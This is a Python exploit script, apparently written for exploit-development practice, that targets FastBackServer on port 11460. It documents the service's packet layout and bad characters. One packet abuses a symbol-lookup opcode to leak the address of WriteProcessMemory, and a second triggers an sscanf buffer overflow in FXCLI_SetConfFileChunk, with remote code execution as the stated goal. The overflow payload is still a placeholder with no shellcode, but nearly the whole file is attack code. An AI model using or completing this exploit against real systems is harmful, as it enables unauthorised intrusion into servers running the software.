#!/usr/bin/python

import socket
import sys
from struct import pack

# Buffer overflow sscanf call: FastBackServer!FXCLI_SetConfFileChunk+0x40

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20

def memory_leak_evil_buffer(symbol_name):
    # psAgentCommand
    buf = bytearray([0x41]*0x0C) # ??
    buf += pack('<i', 0x2000) # Opcode for execution path
    buf += pack('<i', 0x0) # offset 1
    buf += pack('<i', 0x100) # size 1
    buf += pack('<i', 0x100) # offset 2
    buf += pack('<i', 0x100) # size 2
    buf += pack('<i', 0x200) # offset 3
    buf += pack('<i', 0x100) # size 3
    buf += bytearray([0x41]*0x8) # ??
    
    # psCommandBuffer
    buf += b'SymbolOperation'
    sym_op = str.encode(symbol_name)
    buf += sym_op + b'\x00' + bytearray([0x42]*(0x100 - len(sym_op))) # buffer 1
    buf += bytearray([0x43]*0x100) # buffer 2
    buf += bytearray([0x44]*0x100) # buffer 3
    
    # prepend buffer length for the checksum
    buf = pack('>i', len(buf)-4) + buf
    return buf


def exploit_evil_buffer(base_addr):
    # psAgentCommand
    buf = bytearray([0x41]*0x0C) # ??
    buf += pack('<i', 0x0534) # Opcode for execution path
    buf += pack('<i', 0x0) # offset 1
    buf += pack('<i', 0x1000) # size 1
    buf += pack('<i', 0x100) # offset 2
    buf += pack('<i', 0x100) # size 2
    buf += pack('<i', 0x200) # offset 3
    buf += pack('<i', 0x100) # size 3
    buf += bytearray([0x41]*0x8) # ??
    
    # psCommandBuffer
    exp = b'placeholder!' * 100
    # format string of first buffer, expected input with overflow parameter
    buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(exp,0,0,0,0)
    buf += bytearray([0x43]*0x100) # buffer 2
    buf += bytearray([0x44]*0x100) # buffer 3
    
    # prepend buffer length for the checksum
    buf = pack('>i', len(buf)-4) + buf
    return buf


def parse_response(response):
    pattern = b"Address is: "
    offset = response.find(pattern)
    if offset != -1:
        addr_start = offset + len(pattern)
        response = response[addr_start:addr_start+10]
        return response
    return None


def main():
    # parse args and set socket params
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)
    server = sys.argv[1]
    port = int(sys.argv[2])

    # create a connection and leak a base address
    print("[+] Getting symbol base address...")
    buffer = memory_leak_evil_buffer("WriteProcessMemory")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    # receive leaked address from application
    response = s.recv(1024)
    address = parse_response(response)
    if not address:
        print("[!] Expected pattern not found in response. Exiting.")
        return
    address = hex(int(address,16))
    print("[+] Address is: ", address)
    s.close()

    # create another connection, use leaked base address to get RCE
    print("[+] Exploiting binary...")
    buffer = exploit_evil_buffer(address)
    print("\n<<BUFFER>>\n", buffer)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buffer)
    print("[+] Packet sent")
    s.close()

    sys.exit(0)


if __name__ == "__main__":
    main()
